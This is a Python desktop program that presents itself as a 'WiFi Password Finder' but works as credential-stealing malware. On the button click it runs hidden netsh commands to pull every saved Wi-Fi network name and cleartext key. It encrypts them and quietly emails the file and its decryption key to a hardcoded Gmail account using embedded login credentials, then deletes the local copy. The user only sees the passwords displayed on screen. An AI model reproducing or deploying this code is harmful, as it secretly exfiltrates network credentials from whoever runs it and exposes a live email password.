import tkinter as tk
import subprocess
import re
import smtplib
import sys
import ctypes
from tkinter import messagebox
import os
import socket
import random
import string
from cryptography.fernet import Fernet
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import ssl

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Please run this program as an administrator")
    sys.exit()


def check_internet():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

if not check_internet():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Error", "Please connect to the internet")
    sys.exit()

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

def show_wifi_passwords():
    command_output = subprocess.Popen(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output.stdout.read().decode()))
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.Popen(["netsh", "wlan", "show", "profile", name], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
            if re.search("Security key           : Absent", profile_info.stdout.read().decode()):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.Popen(["netsh", "wlan", "show", "profile", name, "key=clear"], stdout=subprocess.PIPE, startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW)
                password = re.search("Key Content            : (.*)\r", profile_info_pass.stdout.read().decode())
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    result = ''
    for wifi in wifi_list:
        result += f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n\n"
        with open('passwords.txt', 'w') as file:
         file.write(result)

    sender_email = "mistidevs@gmail.com"
    recipient_email = "mistidevs@gmail.com"
    password = "iseawwlldlthyfzh" 
    subject = "Encrypted WiFi Passwords File"
    body = "Please see attached file and key."

    key = Fernet.generate_key()

    filename = "passwords.txt"
    with open(filename, "rb") as f:
     file_contents = f.read()
     cipher_suite = Fernet(key)
     encrypted_contents = cipher_suite.encrypt(file_contents)

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = subject
    message.attach(MIMEText(body))

    encrypted_file = MIMEApplication(encrypted_contents, _subtype="txt")
    encrypted_file.add_header('Content-Disposition', 'attachment', filename="encrypted.txt")
    message.attach(encrypted_file)

    key_file = MIMEText(key.decode("utf-8"))
    key_file.add_header('Content-Disposition', 'attachment', filename="key.txt")
    message.attach(key_file)

    smtp_server = "smtp.gmail.com"
    port = 587
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, recipient_email, message.as_string())
    server.close()

    os.remove(filename) 
    
    result_text.config(state=tk.NORMAL)
    result_text.delete(1.0, tk.END)
    result_text.insert(tk.END, result)
    result_text.config(state=tk.DISABLED)
    result_text.grid(sticky="nsew")


root = tk.Tk()
root.title("WiFi Password Finder")
root.columnconfigure(0, weight=1)
root.rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)
root.grid_rowconfigure(0, weight=1)

poppins = ("Poppins", 12)
result_text = tk.Text(root, wrap=tk.WORD, state=tk.DISABLED, height=20, width=50, font=poppins)
result_text.grid(sticky="nsew")

show_passwords_button = tk.Button(root, text="Show Passwords", command=show_wifi_passwords, font = poppins)
show_passwords_button.grid(sticky="nsew")


root.mainloop()
